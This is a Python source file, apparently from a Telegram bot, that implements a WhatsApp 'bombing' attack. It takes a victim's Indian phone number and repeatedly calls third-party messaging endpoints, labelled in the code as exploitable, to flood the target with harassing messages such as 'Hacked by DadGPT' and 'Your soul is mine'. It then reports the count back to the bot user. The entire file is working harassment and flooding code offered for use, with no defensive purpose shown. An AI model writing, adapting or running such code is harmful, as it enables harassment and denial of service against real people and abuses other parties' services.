import requests
import time

def start_bombing(number, update):
    victim = number[2:]  # strip 91
    count = 0
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }

    # 🔥 List of exploitable WhatsApp click-to-chat APIs
    urls = [
        f"https://api.maddycms.com/sendmsg?number=91{victim}&text=Hacked+by+DadGPT%F0%9F%91%BF",
        f"https://wapi.shopmychotu.com/api/whatsapp?number=91{victim}&message=Your+soul+is+mine%F0%9F%92%80",
    ]

    for _ in range(50):  # 50 messages
        for url in urls:
            try:
                requests.get(url, headers=headers, timeout=5)
                count += 1
                if count % 10 == 0:
                    update.message.reply_text(f"💣 Sent {count} messages...")
                time.sleep(1)
            except:
                continue

    update.message.reply_text(f"✅ Bombing complete. {count} messages sent.")
  
